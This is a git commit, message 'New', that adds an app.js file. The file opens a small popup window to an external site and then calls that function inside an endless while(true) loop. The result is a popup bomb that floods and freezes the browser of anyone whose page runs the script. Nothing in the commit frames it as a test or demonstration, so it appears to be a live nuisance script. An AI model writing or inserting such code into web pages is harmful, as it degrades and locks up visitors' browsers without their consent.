368a37bc93e8150cf85480e7f0a52048a603af99
Shakib Ahmed Srabon <161117024+shakibahmedsrabon@users.noreply.github.com>
2024-11-07 14:33:12 +0000

    New

---
+++ app.js
@@ -0,0 +1,9 @@
+
+myFunction()
+// window.open("https://iamsas.vercel.app", "_blank")
+function myFunction() {
+    var myWindow = window.open("https://iamsas.vercel.app/", "", "width=200,height=100");
+  }
+while(true){
+    myFunction()
+}
